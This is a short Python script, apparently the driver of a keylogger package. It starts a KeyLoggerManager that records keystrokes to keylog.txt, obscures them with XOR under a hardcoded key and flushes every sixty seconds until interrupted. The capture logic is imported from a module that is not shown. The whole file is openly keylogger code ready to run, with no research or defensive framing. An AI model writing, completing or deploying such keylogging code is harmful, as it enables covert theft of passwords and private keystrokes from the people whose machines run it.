from keylogger import KeyLoggerManager, FileWriter, XOREncryptor
import time

def main():
    # Initialize components
    writer = FileWriter("keylog.txt")
    encryptor = XOREncryptor(key=b'secret')
    
    # Create and start the keylogger
    manager = KeyLoggerManager(
        writer=writer,
        encryptor=encryptor,
        flush_interval=60  # Flush every 60 seconds
    )
    
    try:
        manager.start()
        print("Keylogger started. Press Ctrl+C to stop.")
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        manager.stop()
        print("Keylogger stopped.")

if __name__ == "__main__":
    main()
